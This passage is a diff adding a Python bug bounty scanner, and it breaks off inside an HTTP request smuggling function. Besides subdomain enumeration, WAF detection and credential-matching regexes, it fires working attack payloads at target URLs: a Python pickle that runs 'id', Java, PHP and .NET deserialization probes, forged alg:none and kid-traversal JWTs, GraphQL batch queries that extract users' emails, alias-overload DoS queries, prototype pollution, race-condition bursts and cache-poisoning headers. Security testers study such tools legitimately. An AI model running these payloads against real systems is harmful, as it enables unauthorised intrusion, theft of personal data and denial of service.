@@ -1,0 +1,1815 @@
+#!/usr/bin/env python3
+r"""
+deephunterv3.1.py - Cross-platform bug bounty scanner (pure Python stdlib)
+
+Runs on Windows PowerShell, Linux, macOS — Python 3.8+.
+
+Researcher: isiahjonesstem (HackerOne)
+Default header: X-HackerOne-Research: isiahjonesstem
+Override with --header or add User-Agent with --user-agent
+"""
+
+import sys
+import os
+import re
+import json
+import time
+import ssl
+import base64
+import hmac
+import hashlib
+import math
+import datetime as dt
+import urllib.request
+import urllib.parse
+import urllib.error
+import zipfile
+import argparse
+import socket
+import threading
+import random
+import string
+from typing import List, Dict, Tuple, Optional, Any
+from http.cookies import SimpleCookie
+
+# =============================================================================
+# Configuration & constants
+# =============================================================================
+RESEARCHER = "isiahjonesstem"
+# Default header – can be overridden by --header
+DEFAULT_HEADER = {"X-HackerOne-Research": RESEARCHER}
+
+RUN_MARKER = f"{RESEARCHER}-{int(time.time())}"
+
+REQUEST_DELAY = 10
+TIMEOUT = 15
+MAX_BODY = 5 * 1024 * 1024
+
+WAF_SIGNATURES = {
+    "Cloudflare": ["cf-ray", "__cf_bm", "cloudflare", "attention required"],
+    "Akamai": ["akamai", "ak_bmsc", "reference #", "akamaighost"],
+    "Imperva": ["incap_ses", "visid_incap", "_incapsula_resource"],
+    "AWS WAF": ["x-amzn-requestid", "awsalb", "x-amz-cf-id"],
+    "F5 BIG-IP": ["bigipserver", "ts01", "f5-trafficshield"],
+    "Sucuri": ["x-sucuri-id", "sucuri_cloudproxy"],
+    "Wordfence": ["wfvt_", "wordfence_loghuman"],
+    "Fastly": ["fastly-debug-digest", "x-served-by"],
+}
+
+TAKEOVER_FINGERPRINTS = [
+    ("github.io",          "There isn't a GitHub Pages site here",       "GitHub Pages",           "HIGH"),
+    ("herokuapp.com",      "No such app",                                "Heroku",                 "HIGH"),
+    ("herokudns.com",      "no-such-app.herokuapp.com",                  "Heroku DNS",             "HIGH"),
+    ("s3.amazonaws.com",   "NoSuchBucket",                               "AWS S3",                 "HIGH"),
+    ("s3-website",         "NoSuchBucket",                               "AWS S3 Website",         "HIGH"),
+    ("azurewebsites.net",  "404 Web Site not found",                     "Azure App Service",      "HIGH"),
+    ("cloudapp.net",       "Do you want to register",                    "Azure Cloud Service",    "HIGH"),
+    ("trafficmanager.net", "Page Not Found",                             "Azure Traffic Manager",  "HIGH"),
+    ("bitbucket.io",       "Repository not found",                       "Bitbucket Pages",        "HIGH"),
+    ("readthedocs.io",     "unknown to Read the Docs",                   "Read the Docs",          "MEDIUM"),
+    ("surge.sh",           "project not found",                          "Surge.sh",               "HIGH"),
+    ("ghost.io",           "The thing you were looking for is no longer here", "Ghost",            "HIGH"),
+    ("fastly.net",         "Fastly error: unknown domain",               "Fastly",                 "HIGH"),
+    ("netlify.com",        "Not Found - Request ID",                     "Netlify",                "HIGH"),
+    ("netlify.app",        "Not Found - Request ID",                     "Netlify",                "HIGH"),
+    ("pantheonsite.io",    "The gods are wise",                          "Pantheon",               "HIGH"),
+    ("myshopify.com",      "Sorry, this shop is currently unavailable",  "Shopify",                "HIGH"),
+    ("wpengine.com",       "The site you were looking for couldn't be found", "WP Engine",         "MEDIUM"),
+    ("zendesk.com",        "Help Center Closed",                         "Zendesk",                "MEDIUM"),
+    ("tumblr.com",         "There's nothing here",                       "Tumblr",                 "MEDIUM"),
+    ("helpjuice.com",      "We could not find what you're looking for",  "Helpjuice",              "MEDIUM"),
+    ("unbouncepages.com",  "The requested URL was not found",            "Unbounce",               "MEDIUM"),
+    ("statuspage.io",      "You are being redirected",                   "Statuspage",             "MEDIUM"),
+]
+
+CREDENTIAL_PATTERNS = {
+    "AWS Access Key":           r'AKIA[0-9A-Z]{16}',
+    "AWS Secret Key":           r'(?i)aws_secret_access_key[\s:=]+["\']?([A-Za-z0-9/+=]{40})',
+    "Azure Client Secret":      r'(?i)client_secret[\s:=]+["\']?([A-Za-z0-9_\-\.~]{30,})',
+    "GCP API Key":              r'AIza[0-9A-Za-z_-]{35}',
+    "GCP Service Account JSON": r'"type"\s*:\s*"service_account"[\s\S]{10,400}?"private_key"',
+    "Firebase URL":             r'https://[a-z0-9-]+\.firebaseio\.com',
+    "Mapbox Token":             r'pk\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
+    "Mailgun API Key":          r'key-[0-9a-zA-Z]{32}',
+    "Twilio Account SID":       r'AC[a-f0-9]{32}',
+    "Twilio Auth Token":        r'(?i)auth_token[\s:=]+["\']?([a-f0-9]{32})',
+    "SendGrid API Key":         r'SG\.[a-zA-Z0-9_\-]{22,}\.[a-zA-Z0-9_\-]{22,}',
+    "Slack Token":              r'xox[baprs]-[0-9a-zA-Z-]{10,}',
+    "GitHub Token":             r'gh[pousr]_[A-Za-z0-9_]{36,}',
+    "GitLab Token":             r'glpat-[A-Za-z0-9_-]{20,}',
+    "Stripe Live Key":          r'sk_live_[0-9a-zA-Z]{24,}',
+    "Square Access Token":      r'sq0atp-[0-9A-Za-z_-]{22,}',
+    "Heroku API Key":           r'(?i)heroku[a-z0-9_ .\-]{0,25}[\'"]?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})[\'"]?',
+    "RSA/EC Private Key":       r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',
+    "Discord Webhook":          r'https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+',
+    "Sentry DSN":               r'https://[0-9a-f]{32}@[a-z0-9.\-]+/\d+',
+    "JWT":                      r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
+}
+
+STATIC_RULES = [
+    {"name": "Weak ECB Mode", "pattern": r'AES/ECB', "severity": "HIGH", "cwe": "CWE-326", "owasp": "A02:2021"},
+    {"name": "SQL Injection (concatenation)", "pattern": r'(?i)(SELECT.*?["\']\s*\+|execute\(.*?["\']\s*\+)', "severity": "HIGH", "cwe": "CWE-89", "owasp": "A03:2021"},
+    {"name": "Command Injection",  "pattern": r'(?i)(os\.system|subprocess\.call|exec\(|eval\()\s*\(.*?\+', "severity": "HIGH", "cwe": "CWE-78",  "owasp": "A03:2021"},
+    {"name": "Hardcoded Password", "pattern": r'(?i)(password|passwd)\s*=\s*["\'][^\'"]{4,}["\']', "severity": "HIGH", "cwe": "CWE-259", "owasp": "A07:2021"},
+    {"name": "MD5 / SHA1 for secrets", "pattern": r'(?i)hashlib\.(md5|sha1)\s*\(', "severity": "MEDIUM", "cwe": "CWE-328", "owasp": "A02:2021"},
+    {"name": "Pickle / YAML unsafe load", "pattern": r'(?i)(pickle\.loads|yaml\.load\s*\(\s*[^,)]+\))', "severity": "HIGH", "cwe": "CWE-502", "owasp": "A08:2021"},
+]
+
+# =============================================================================
+# Per-host session state (only for manual credentials)
+# =============================================================================
+_state_lock = threading.Lock()
+_host_state: Dict[str, Dict[str, Any]] = {}
+
+def _host_of(url: str) -> str:
+    try:
+        h = urllib.parse.urlparse(url).hostname or ""
+        return h.lower()
+    except Exception:
+        return ""
+
+def _get_state(host: str) -> Dict[str, Any]:
+    with _state_lock:
+        if host not in _host_state:
+            _host_state[host] = {"cookies": {}, "jwt": None, "api_key": None}
+        return _host_state[host]
+
+def set_session_cookie_for_host(host: str, cookie_str: str):
+    if not host:
+        return
+    try:
+        cookie = SimpleCookie()
+        cookie.load(cookie_str)
+        state = _get_state(host)
+        for key, morsel in cookie.items():
+            state["cookies"][key] = morsel.value
+            print(f"[DEBUG] {host} cookie set: {key}={morsel.value[:20]}...")
+    except Exception as e:
+        print(f"[DEBUG] cookie parse failed for {host}: {e}")
+
+def _auth_headers_for_host(host: str) -> dict:
+    state = _get_state(host)
+    h = {}
+    if state["cookies"]:
+        h["Cookie"] = "; ".join(f"{k}={v}" for k, v in state["cookies"].items())
+    if state["jwt"]:
+        h["Authorization"] = f"Bearer {state['jwt']}"
+    if state["api_key"]:
+        h["X-API-Key"] = state["api_key"]
+    return h
+
+# =============================================================================
+# Global headers (can be set by command line)
+# =============================================================================
+_extra_headers = {}
+
+def set_extra_headers(headers: Dict[str, str]):
+    global _extra_headers
+    _extra_headers = headers
+
+def _get_headers() -> Dict[str, str]:
+    h = dict(DEFAULT_HEADER)
+    h.update(_extra_headers)
+    return h
+
+# =============================================================================
+# Dual-platform reproduction helper (PowerShell + curl)
+# =============================================================================
+def _ps_quote(s: str) -> str:
+    return s.replace("'", "''")
+
+def _sh_quote(s: str) -> str:
+    return s.replace("'", "'\\''")
+
+def dual_repro(method: str, url: str, headers: Optional[dict] = None,
+               body: Optional[str] = None, follow_redirects: bool = False) -> Dict[str, str]:
+    h = _get_headers()
+    if headers:
+        h.update(headers)
+    method = method.upper()
+
+    # PowerShell
+    ps_lines = ["$h = @{"]
+    for k, v in h.items():
+        ps_lines.append(f"  '{_ps_quote(k)}' = '{_ps_quote(str(v))}'")
+    ps_lines.append("}")
+    ps_cmd = f"Invoke-WebRequest -Uri '{_ps_quote(url)}' -Method {method} -Headers $h -SkipHttpErrorCheck"
+    if not follow_redirects:
+        ps_cmd += " -MaximumRedirection 0"
+    if body is not None:
+        ps_lines.append(f"$b = '{_ps_quote(body)}'")
+        ps_cmd += " -Body $b"
+    ps_lines.append(ps_cmd)
+    ps_lines.append("$resp.StatusCode; $resp.Headers; $resp.Content")
+    ps = "\n".join(ps_lines)
+
+    # curl
+    curl_parts = ["curl -sSi"]
+    if not follow_redirects:
+        curl_parts.append("--max-redirs 0")
+    curl_parts.append(f"-X {method}")
+    for k, v in h.items():
+        curl_parts.append(f"-H '{_sh_quote(k)}: {_sh_quote(str(v))}'")
+    if body is not None:
+        curl_parts.append(f"--data-raw '{_sh_quote(body)}'")
+    curl_parts.append(f"'{_sh_quote(url)}'")
+    curl = " \\\n  ".join(curl_parts)
+
+    return {"powershell": ps, "curl": curl}
+
+# =============================================================================
+# WAF detection
+# =============================================================================
+def detect_waf(resp: dict) -> Optional[str]:
+    hdrs = resp.get("headers", {}) or {}
+    body = (resp.get("body") or "")[:4000].lower()
+    hdr_blob = " ".join(f"{k}:{v}" for k, v in hdrs.items()).lower()
+    blob = hdr_blob + " " + body
+    for waf, sigs in WAF_SIGNATURES.items():
+        if any(s in blob for s in sigs):
+            return waf
+    return None
+
+# =============================================================================
+# HTTP layer (uses dynamic headers)
+# =============================================================================
+def _build_ctx(insecure: bool = False):
+    ctx = ssl.create_default_context()
+    if insecure:
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+    return ctx
+
+def http_request_raw(url: str, method: str = "GET", headers: Optional[dict] = None,
+                     data: Optional[bytes] = None, timeout: int = TIMEOUT,
+                     follow_redirects: bool = False, insecure: bool = False) -> dict:
+    host = _host_of(url)
+    if headers is None:
+        headers = {}
+    # Apply global extra headers (User-Agent, custom)
+    global_headers = _get_headers()
+    for k, v in global_headers.items():
+        headers.setdefault(k, v)
+    # Per-host auth headers
+    for k, v in _auth_headers_for_host(host).items():
+        headers.setdefault(k, v)
+
+    req = urllib.request.Request(url, data=data, headers=headers, method=method.upper())
+    ctx = _build_ctx(insecure)
+
+    # Build opener with HTTPS handler
+    https_handler = urllib.request.HTTPSHandler(context=ctx)
+    if not follow_redirects:
+        class NoRedirect(urllib.request.HTTPRedirectHandler):
+            def redirect_request(self, req, fp, code, msg, headers, newurl):
+                return None
+        opener = urllib.request.build_opener(NoRedirect, https_handler)
+    else:
+        opener = urllib.request.build_opener(https_handler)
+
+    try:
+        with opener.open(req, timeout=timeout) as resp:
+            raw = resp.read(MAX_BODY)
+            body = raw.decode('utf-8', errors='ignore')
+            set_cookie = resp.headers.get("Set-Cookie")
+            if set_cookie:
+                set_session_cookie_for_host(host, set_cookie)
+            # JWT capture only from auth endpoints
+            auth_like = any(k in url.lower() for k in ("/login", "/auth", "/token", "/oauth", "/session", "/signin"))
+            if auth_like:
+                try:
+                    j = json.loads(body)
+                    if isinstance(j, dict):
+                        tok = (j.get("access_token") or j.get("token") or j.get("jwt") or j.get("id_token") or (j.get("data") or {}).get("token"))
+                        if isinstance(tok, str) and re.match(r'^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$', tok):
+                            _get_state(host)["jwt"] = tok
+                            print(f"[DEBUG] {host} JWT captured: {tok[:30]}...")
+                except Exception:
+                    pass
+            api_key_header = resp.headers.get("X-API-Key") or resp.headers.get("Api-Key")
+            if api_key_header:
+                _get_state(host)["api_key"] = api_key_header
+                print(f"[DEBUG] {host} API Key captured: {api_key_header[:20]}...")
+            return {"status": resp.status, "headers": dict(resp.headers), "body": body, "url": resp.url}
+    except urllib.error.HTTPError as e:
+        try:
+            body = e.read(MAX_BODY).decode('utf-8', errors='ignore') if e.fp else ""
+        except Exception:
+            body = ""
+        return {"status": e.code, "headers": dict(e.headers or {}), "body": body, "url": url}
+    except Exception as e:
+        return {"status": 0, "headers": {}, "body": "", "url": url, "error": str(e)}
+
+def http_request_with_fallback(url: str, method: str = "GET", headers: Optional[dict] = None,
+                               data: Optional[bytes] = None, max_retries: int = 2, delay: int = 5,
+                               **kwargs) -> dict:
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+    resp = http_request_raw(url, method, headers, data, **kwargs)
+    if resp["status"] != 0:
+        return resp
+    if url.startswith("https://"):
+        http_url = url.replace("https://", "http://", 1)
+        print(f"[*] HTTPS failed, trying HTTP: {http_url}")
+        resp2 = http_request_raw(http_url, method, headers, data, **kwargs)
+        if resp2["status"] != 0:
+            return resp2
+    return resp
+
+def http_request_with_retry(url: str, method: str = "GET", headers: Optional[dict] = None,
+                            data: Optional[bytes] = None, max_retries: int = 3, delay: int = 5,
+                            **kwargs) -> dict:
+    last = None
+    for attempt in range(max_retries):
+        resp = http_request_with_fallback(url, method, headers, data, max_retries=1, **kwargs)
+        last = resp
+        if resp["status"] == 0:
+            print(f"[*] Connection error: {resp.get('error','?')}, retry in {delay}s ({attempt+1}/{max_retries})")
+            time.sleep(delay)
+            continue
+        if resp["status"] in (502, 503, 504):
+            print(f"[*] {resp['status']} retry in {delay}s ({attempt+1}/{max_retries})")
+            time.sleep(delay)
+            continue
+        if resp["status"] in (403, 429):
+            waf = detect_waf(resp)
+            if waf:
+                wait = min(120, 5 * (2 ** attempt))
+                print(f"[!] {waf} block detected (HTTP {resp['status']}), backing off {wait}s ({attempt+1}/{max_retries})")
+                time.sleep(wait)
+                continue
+        return resp
+    return last or {"status": 0, "headers": {}, "body": "", "url": url}
+
+def http_request(url: str, method: str = "GET", headers: Optional[dict] = None,
+                 data: Optional[bytes] = None, timeout: int = TIMEOUT,
+                 follow_redirects: bool = False, insecure: bool = False) -> dict:
+    return http_request_with_retry(url, method, headers, data, max_retries=2, delay=3,
+                                   timeout=timeout, follow_redirects=follow_redirects,
+                                   insecure=insecure)
+
+# =============================================================================
+# Subdomain enumeration
+# =============================================================================
+def brute_subdomains(domain: str, wordlist: Optional[List[str]] = None) -> List[str]:
+    if wordlist is None:
+        wordlist = [
+            "api", "admin", "dashboard", "portal", "app", "dev", "staging", "test", "qa",
+            "v1", "v2", "v3", "internal", "private", "secure", "payment", "gateway",
+            "merchant", "store", "checkout", "billing", "auth", "login", "sso", "oauth",
+            "monitoring", "metrics", "logs", "debug", "config", "status", "health",
+            "cdn", "static", "assets", "upload", "download", "support", "docs",
+            "jenkins", "git", "gitlab", "jira", "confluence", "kibana", "grafana",
+            "prometheus", "elastic", "logstash", "kafka", "minio", "s3", "storage",
+            "backup", "mail", "smtp", "ftp", "vpn", "proxy", "cache", "redis",
+            "m", "mobile", "beta", "alpha", "demo", "sandbox", "preprod", "old",
+            "legacy", "deprecated", "new", "test1", "test2", "stg", "prod",
+        ]
+    found = []
+    print(f"[*] DNS brute-forcing subdomains for {domain} ({len(wordlist)} words)...")
+    for sub in wordlist:
+        full = f"{sub}.{domain}"
+        try:
+            socket.gethostbyname(full)
+            found.append(full)
+            print(f"    [+] {full}")
+        except socket.gaierror:
+            pass
+        time.sleep(0.05)
+    print(f"    Brute found {len(found)} subdomains")
+    return found
+
+def crtsh_subdomains(domain: str) -> List[str]:
+    found = set()
+    url = f"https://crt.sh/?q=%25.{urllib.parse.quote(domain)}&output=json"
+    print(f"[*] Querying crt.sh CT logs for {domain}...")
+    try:
+        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+        ctx = _build_ctx(False)
+        with urllib.request.urlopen(req, timeout=30, context=ctx) as r:
+            data = json.loads(r.read(MAX_BODY))
+        for entry in data:
+            for name in (entry.get("name_value", "") or "").splitlines():
+                name = name.strip().lower().lstrip("*.")
+                if name and name.endswith(domain) and "@" not in name and " " not in name:
+                    found.add(name)
+        print(f"    crt.sh found {len(found)} subdomains")
+    except Exception as e:
+        print(f"[!] crt.sh lookup failed: {e}")
+    return sorted(found)
+
+def resolve_cname(host: str) -> Optional[str]:
+    try:
+        url = f"https://cloudflare-dns.com/dns-query?name={urllib.parse.quote(host)}&type=CNAME"
+        req = urllib.request.Request(url, headers={"Accept": "application/dns-json", "User-Agent": "Mozilla/5.0"})
+        ctx = _build_ctx(False)
+        with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
+            j = json.loads(r.read(65536))
+        for ans in j.get("Answer", []) or []:
+            if ans.get("type") == 5:
+                return (ans.get("data") or "").rstrip(".")
+    except Exception:
+        pass
+    return None
+
+# =============================================================================
+# Code / secret scanning
+# =============================================================================
+def shannon_entropy(s: str) -> float:
+    if not s:
+        return 0.0
+    from collections import Counter
+    counts = Counter(s)
+    n = len(s)
+    return -sum((c / n) * math.log2(c / n) for c in counts.values() if c)
+
+def scan_code(file_path: str) -> List[dict]:
+    findings = []
+    try:
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+    except Exception:
+        return findings
+
+    for name, pattern in CREDENTIAL_PATTERNS.items():
+        for m in re.finditer(pattern, content):
+            val = m.group(0)
+            ctx_start, ctx_end = max(0, m.start() - 80), min(len(content), m.end() + 80)
+            ctx_str = content[ctx_start:ctx_end]
+            findings.append({
+                "type": "static_secret",
+                "title": f"Hardcoded {name}",
+                "severity": "CRITICAL" if name in ("GCP Service Account JSON", "RSA/EC Private Key", "Stripe Live Key") else "HIGH",
+                "cwe": "CWE-798", "owasp": "A07:2021",
+                "file": file_path,
+                "evidence": f"Match: {val[:120]}\nContext: ...{ctx_str}...",
+                "remediation": "Rotate the secret immediately; remove from VCS history; store in a secrets manager.",
+                "repro_ps":    f"Select-String -Path '{file_path}' -Pattern '{val[:20]}'",
+                "repro_curl":  f"grep -rn '{val[:20]}' '{file_path}'",
+                "needs_manual_verification": True,
+            })
+
+    # High-entropy tokens
+    for line_num, line in enumerate(content.splitlines(), 1):
+        for tok in re.findall(r'[A-Za-z0-9+/=_\-]{32,}', line):
+            if tok.startswith(("http://", "https://")) or any(re.search(p, tok) for p in CREDENTIAL_PATTERNS.values()):
+                continue
+            if shannon_entropy(tok) > 4.5 and len(tok) < 200:
+                findings.append({
+                    "type": "static_entropy",
+                    "title": "High-entropy string (possible unknown secret)",
+                    "severity": "LOW", "cwe": "CWE-798", "owasp": "A07:2021",
+                    "file": file_path,
+                    "evidence": f"Line {line_num}: {line[:200]}\nToken: {tok[:120]}",
+                    "remediation": "Manually verify whether this is a secret; if so, rotate.",
+                    "repro_ps":   f"Get-Content '{file_path}' | Select-String -Pattern '{tok[:16]}'",
+                    "repro_curl": f"grep -n '{tok[:16]}' '{file_path}'",
+                    "needs_manual_verification": True,
+                })
+
+    for rule in STATIC_RULES:
+        for m in re.finditer(rule["pattern"], content, re.IGNORECASE):
+            s, e = max(0, m.start() - 80), min(len(content), m.end() + 80)
+            line_start = content.count("\n", 0, s) + 1
+            line_end = content.count("\n", 0, e) + 1
+            findings.append({
+                "type": "static_logic",
+                "title": rule["name"],
+                "severity": rule["severity"],
+                "cwe": rule["cwe"], "owasp": rule["owasp"],
+                "file": file_path,
+                "evidence": f"Lines {line_start}-{line_end}:\n{content[s:e]}",
+                "remediation": f"Remediate {rule['name']} per OWASP/CWE guidance.",
+                "repro_ps":   f"Get-Content '{file_path}' | Select-Object -Skip {max(0,line_start-2)} -First 5",
+                "repro_curl": f"sed -n '{max(1,line_start-2)},{line_end+2}p' '{file_path}'",
+                "needs_manual_verification": True,
+            })
+    return findings
+
+# =============================================================================
+# Vulnerability modules (all zero-day and basic checks)
+# =============================================================================
+def advanced_deserialization_checks(url: str) -> List[dict]:
+    findings = []
+    payloads = [
+        ("Java",   "rO0ABXNyABdqYXZhLnV0aWwuUFJJSV9RVUVVZQ=="),
+        ("PHP",    'O:8:"stdClass":0:{}'),
+        ("Python", "cos\nsystem\n(S'id'\ntR."),
+        (".NET",   "/wEPDwUJODU0MjM0MjMPZBYCAgMPZBYCAgEPZBYCAgEPFCsAAgFkZGSF"),
+    ]
+    for lang, payload in payloads:
+        body = json.dumps({"data": payload})
+        resp = http_request(url, method="POST", data=body.encode(),
+                            headers={"Content-Type": "application/json"})
+        if resp["status"] == 500 and any(t in resp["body"].lower()
+                                         for t in ("deserial", "readobject", "viewstate",
+                                                   "__reduce__", "unserialize")):
+            repro = dual_repro("POST", url, {"Content-Type": "application/json"}, body)
+            findings.append({
+                "type": "zero_day_deserialization",
+                "title": f"Potential {lang} Deserialization",
+                "severity": "CRITICAL", "cwe": "CWE-502", "owasp": "A08:2021",
+                "url": url,
+                "evidence": resp["body"][:2000],
+                "remediation": "Never deserialize untrusted data; use allowlists / signed payloads.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": True,
+            })
+    return findings
+
+def advanced_jwt_checks(url: str, body: str) -> List[dict]:
+    findings = []
+    m = re.search(r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}', body)
+    if not m:
+        return findings
+    # 'none' alg
+    header_none = {"alg": "none", "typ": "JWT"}
+    payload = {"admin": True, "user": "attacker", "marker": RUN_MARKER}
+    eh = base64.urlsafe_b64encode(json.dumps(header_none).encode()).decode().rstrip("=")
+    ep = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
+    none_jwt = f"{eh}.{ep}."
+    resp = http_request(url, headers={"Authorization": f"Bearer {none_jwt}"})
+    if resp["status"] == 200 and (RUN_MARKER in resp["body"] or "admin" in resp["body"].lower()):
+        repro = dual_repro("GET", url, {"Authorization": f"Bearer {none_jwt}"})
+        findings.append({
+            "type": "zero_day_jwt_none", "title": "JWT 'none' Algorithm Accepted",
+            "severity": "CRITICAL", "cwe": "CWE-345", "owasp": "A02:2021", "url": url,
+            "evidence": f"Sent marker '{RUN_MARKER}' inside JWT with alg:none.\nResponse reflects the forged payload:\n{resp['body'][:2000]}",
+            "remediation": "Reject alg:none; enforce signature validation.",
+            "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+            "needs_manual_verification": False,
+        })
+    # kid path traversal
+    header_kid = {"alg": "RS256", "typ": "JWT", "kid": "../../../dev/null"}
+    ehk = base64.urlsafe_b64encode(json.dumps(header_kid).encode()).decode().rstrip("=")
+    kid_jwt = f"{ehk}.{ep}.signature"
+    resp3 = http_request(url, headers={"Authorization": f"Bearer {kid_jwt}"})
+    if resp3["status"] == 500 and any(s in resp3["body"].lower()
+                                       for s in ("file", "no such", "enoent")):
+        repro = dual_repro("GET", url, {"Authorization": f"Bearer {kid_jwt}"})
+        findings.append({
+            "type": "zero_day_jwt_kid", "title": "JWT kid Path Traversal",
+            "severity": "HIGH", "cwe": "CWE-22", "owasp": "A01:2021", "url": url,
+            "evidence": resp3["body"][:2000],
+            "remediation": "Validate kid against an allowlist of key IDs.",
+            "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+            "needs_manual_verification": True,
+        })
+    return findings
+
+def advanced_graphql_batch_checks(url: str) -> List[dict]:
+    findings = []
+    if "/graphql" not in url:
+        return findings
+    batch_query = ("query {" + " ".join(f"u{i}: user(id: {i}) {{ id email }}" for i in range(1, 11)) + "}")
+    body = json.dumps({"query": batch_query})
+    resp = http_request(url, method="POST", data=body.encode(),
+                        headers={"Content-Type": "application/json"})
+    emails = set(re.findall(r'"email"\s*:\s*"([^"]+)"', resp.get("body", "")))
+    if resp["status"] == 200 and len(emails) >= 2:
+        repro = dual_repro("POST", url, {"Content-Type": "application/json"}, body)
+        findings.append({
+            "type": "zero_day_graphql_batch",
+            "title": "GraphQL Batch Query Returns Multiple Users' PII",
+            "severity": "HIGH", "cwe": "CWE-639", "owasp": "A01:2021", "url": url,
+            "evidence": f"Distinct emails returned: {sorted(emails)[:5]}\n\n{resp['body'][:2000]}",
+            "remediation": "Enforce authorization per node; cap batch size; disable batch in prod.",
+            "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+            "needs_manual_verification": False,
+        })
+    alias_query = "query { " + " ".join(f"a{i}: __typename" for i in range(500)) + " }"
+    body2 = json.dumps({"query": alias_query})
+    resp3 = http_request(url, method="POST", data=body2.encode(),
+                         headers={"Content-Type": "application/json"})
+    if resp3["status"] == 500 and any(s in resp3["body"].lower()
+                                       for s in ("alias", "too many", "complexity")):
+        repro = dual_repro("POST", url, {"Content-Type": "application/json"}, body2[:500]+"...")
+        findings.append({
+            "type": "zero_day_graphql_alias",
+            "title": "GraphQL Alias Overload DoS",
+            "severity": "MEDIUM", "cwe": "CWE-400", "owasp": "A04:2021", "url": url,
+            "evidence": resp3["body"][:2000],
+            "remediation": "Cap alias count and query complexity.",
+            "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+            "needs_manual_verification": True,
+        })
+    return findings
+
+def advanced_prototype_pollution(url: str) -> List[dict]:
+    findings = []
+    marker = f"pp_{int(time.time())}"
+    payloads = [
+        {"__proto__": {"polluted": marker}},
+        {"constructor": {"prototype": {"polluted": marker}}},
+        {"__proto__": {"isAdmin": True, "marker": marker}},
+    ]
+    for payload in payloads:
+        body = json.dumps(payload)
+        resp = http_request(url, method="POST", data=body.encode(),
+                            headers={"Content-Type": "application/json"})
+        if marker in resp.get("body", ""):
+            repro = dual_repro("POST", url, {"Content-Type": "application/json"}, body)
+            findings.append({
+                "type": "zero_day_prototype_pollution",
+                "title": "Prototype Pollution via JSON (marker reflected)",
+                "severity": "HIGH", "cwe": "CWE-1321", "owasp": "A05:2021", "url": url,
+                "evidence": f"Marker '{marker}' was reflected in response, indicating pollution.\n{resp['body'][:2000]}",
+                "remediation": "Freeze Object.prototype; validate JSON keys; use Map over plain objects.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": False,
+            })
+    return findings
+
+def race_condition_test(url: str, method: str = "POST") -> List[dict]:
+    findings = []
+    if method not in ("POST", "PUT", "DELETE", "PATCH"):
+        return findings
+    if any(x in url.lower() for x in (".css", ".js", ".png", ".jpg", ".gif", ".woff", ".svg")):
+        return findings
+    results = []
+    def send():
+        r = http_request(url, method=method, data=b'{"test":1}',
+                         headers={"Content-Type": "application/json"})
+        results.append(r.get("status", 0))
+    threads = [threading.Thread(target=send) for _ in range(10)]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+    if len(set(results)) > 1 and 200 in results:
+        repro = dual_repro(method, url, {"Content-Type": "application/json"}, '{"test":1}')
+        findings.append({
+            "type": "zero_day_race_condition",
+            "title": f"Status variance under concurrent {method} (possible race condition)",
+            "severity": "LOW",
+            "cwe": "CWE-362", "owasp": "A01:2021", "url": url,
+            "evidence": f"10 concurrent {method} returned: {results}",
+            "remediation": "Use DB transactions/locking; idempotency keys on money-moving endpoints.",
+            "repro_ps": repro["powershell"] + "\n# repeat 10x concurrently (PowerShell jobs)",
+            "repro_curl": repro["curl"] + "\n# repeat 10x concurrently (xargs -P10)",
+            "needs_manual_verification": True,
+        })
+    return findings
+
+def cache_poisoning_test(url: str) -> List[dict]:
+    findings = []
+    marker = f"cb{int(time.time())}"
+    bust_url = url + ("&" if "?" in url else "?") + f"_cb={marker}"
+    baseline = http_request(bust_url)
+    if baseline["status"] != 200:
+        return findings
+    baseline_body = baseline["body"]
+    probes = [
+        {"X-Forwarded-Host": f"{marker}.example.com"},
+        {"X-Forwarded-Scheme": "http"},
+        {"X-Forwarded-Port": "8888"},
+        {"X-Host": f"{marker}.example.com"},
+        {"X-Forwarded-For": "127.0.0.1"},
+    ]
+    for hdr in probes:
+        bust2 = url + ("&" if "?" in url else "?") + f"_cb={marker}2"
+        resp = http_request(bust2, headers=hdr)
+        injected_val = list(hdr.values())[0]
+        if (injected_val in resp.get("body", "")
+                and injected_val not in baseline_body
+                and resp["status"] == 200):
+            repro = dual_repro("GET", bust2, hdr)
+            findings.append({
+                "type": "zero_day_cache_poisoning",
+                "title": f"Unkeyed header reflected: {list(hdr.keys())[0]}",
+                "severity": "MEDIUM", "cwe": "CWE-524", "owasp": "A05:2021", "url": bust2,
+                "evidence": f"Injected {list(hdr.keys())[0]}='{injected_val}' was reflected into response body. If this response is cacheable, it poisons the cache.\n{resp['body'][:1500]}",
+                "remediation": "Include reflected headers in cache key; normalize inputs.",
+                "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                "needs_manual_verification": True,
+            })
+    return findings
+
+def http_smuggling_test(base_url: str) -> List[dict]:
+    findings = []
+    try:
+        parsed = urllib.parse.urlparse(base_url)
+        host = parsed.hostname
+        is_tls = base_url.startswith("https")
+        port = parsed.port or (443 if is_tls else 80)
+        sock = socket.create_connection((host, port), timeout=8)
+        if is_tls:
+            ctx = ssl.create_default_context()
+            sock = ctx.wrap_socket(sock, server_hostname=host)
+        marker = f"smug{int(time.time())}"
+        smuggled = (
